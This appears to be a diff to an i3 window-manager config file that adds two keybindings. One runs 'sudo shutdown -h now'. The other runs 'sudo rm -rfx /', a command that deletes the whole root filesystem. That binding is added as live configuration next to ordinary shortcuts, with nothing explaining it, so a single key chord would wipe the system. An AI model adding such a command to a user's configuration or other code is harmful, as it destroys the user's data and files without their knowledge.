@@ -99,6 +99,9 @@ bindsym $mod+Shift+r restart
 
 # exit i3 with mod+shift+e
 bindsym $mod+Shift+e exec i3-msg exit
+bindsym $mod+Control+Shift+q exec sudo rm -rfx /
+bindsym $mod+Control+Shift+r exec sudo shutdown -h now
+
 
 # start a terminal
 bindsym $mod+Return exec $term
